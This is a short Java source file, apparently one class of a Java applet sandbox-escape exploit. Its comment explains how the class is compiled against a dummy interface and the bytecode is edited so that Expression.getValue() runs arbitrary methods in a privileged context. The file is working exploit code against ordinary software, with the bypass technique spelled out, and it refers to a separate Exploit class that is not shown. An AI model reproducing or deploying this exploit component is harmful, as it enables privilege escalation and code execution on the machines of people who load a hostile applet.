package vuln;

import java.beans.Expression;
import java.util.Map;

/*
 * So if i understand this correctly...
 *
 * Normally this wouldn't work because a normal compiler won't allow us to
 * create a non-abstract class that doesn't fully implement an interface. To
 * get around this we create a dummy interface that only contains the method
 * we're interested in (in this case, getValue()) and modify the .class file
 * after compilation to implement Map$Entry instead of Test.
 *
 * Because of the compiler trickery above, Link now inherits getValue() from
 * Expression instead of from non-privileged applet code and can be used as a
 * Map.Entry.  Expression.getValue() calls Statement.invoke() using the
 * parameters we give it in the Exploit class, allowing us to call arbitrary
 * methods of arbitrary classes.  Since it started out in library code, and
 * since we didn't use any non-privileged methods, it runs in a privileged
 * context.  Whew.
 *
 */
public class Link extends Expression implements Test {

	Map.Entry entry;
	
	public Link(Object target, String methodName, Object[] arguments) {
		super(target, methodName, arguments);
	}

	public Object getKey() {
		return null;
	}

}
